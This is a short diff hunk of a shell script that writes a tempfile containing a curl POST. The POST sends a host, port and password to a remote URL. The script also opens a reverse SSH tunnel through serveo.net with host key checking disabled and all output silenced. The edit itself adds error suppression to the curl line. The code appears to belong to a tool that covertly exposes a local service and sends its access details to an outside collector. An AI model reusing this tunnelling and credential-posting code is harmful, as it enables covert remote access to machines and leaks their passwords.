@@ -28,7 +28,7 @@ port=$(shuf -i 1024-9999 -n 1)
 echo "[+] Creating tempfile..."
 cat > $temp << EOF
 sleep 3
-curl -s -X POST --data "xhost=$host&xport=$port&xpass=$pass" $url
+curl -s -X POST --data "xhost=$host&xport=$port&xpass=$pass" $url 2>/dev/null 2<&1
 EOF
 echo "[+] Creating request to serveo.net..."
 ssh -o StrictHostKeyChecking=no -R $host:$port:localhost:$port serveo.net > /dev/null 2>&1 &
